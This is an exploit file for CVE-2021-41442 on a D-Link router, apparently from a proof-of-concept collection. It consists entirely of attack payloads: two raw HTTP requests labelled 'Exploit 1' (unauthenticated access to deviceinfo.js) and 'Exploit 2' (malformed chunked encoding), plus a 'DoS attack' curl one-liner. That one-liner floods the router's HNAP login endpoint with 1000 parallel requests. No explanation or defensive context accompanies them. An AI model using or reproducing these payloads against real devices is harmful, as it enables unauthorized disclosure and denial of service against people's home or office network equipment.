Web/D-Link/CVE-2021-41442/exploit_http

Exploit 1
GET /config/deviceinfo.js?v=1da1221984&_=1629148114777 HTTP/1.1\r\n
Host: 192.168.0.1\r\n
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\n
Accept: text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01\r\n
Accept-Language: en-US,en;q=0.5\r\n
Accept-Encoding: gzip, deflate\r\n
X-Requested-With: XMLHttpRequest\r\n
Connection: close\r\n
Referer: http://192.168.0.1/info/Login.html\r\n
Cookie: uid=null\r\n
\r\n
\r\n

Exploit 2
GET / HTTP/1.1\r\n
Host: 192.168.0.1\r\n
Transfer-Encoding: chunked\r\n\r\n
Content-Length: 4\r\n
\r\n
1\r\n
A\r\n
X\r\n

DoS attack
seq 1 1000 | xargs -n1 -P1000 curl -i -s -k -X $'POST' \
-H $'Host: 192.168.0.1' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: text/xml; charset=utf-8' -H $'SOAPAction: \"http://purenetworks.com/HNAP1/SetPortForwardingSettings\"' -H $'X-Requested-With: XMLHttpRequest' -H $'Content-Length: 10000' -H $'Transfer-Encoding: chunked' -H $'Origin: http://192.168.0.1' -H $'Connection: keep-alive' -H $'Referer: http://192.168.0.1/info/Login.html' -H $'Pragma: no-cache' -H $'Cache-Control: max-age=0' \
--data-binary $'<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><Login xmlns=\"http://purenetworks.com/HNAP1/\"><Action>login</Action><Username>Admin</Username><LoginPassword>AE5126DE286A086302CACC6EFF324892</LoginPassword><Captcha></Captcha></Login></soap:Body></soap:Envelope>' \
$'http://192.168.0.1/HNAP1/'
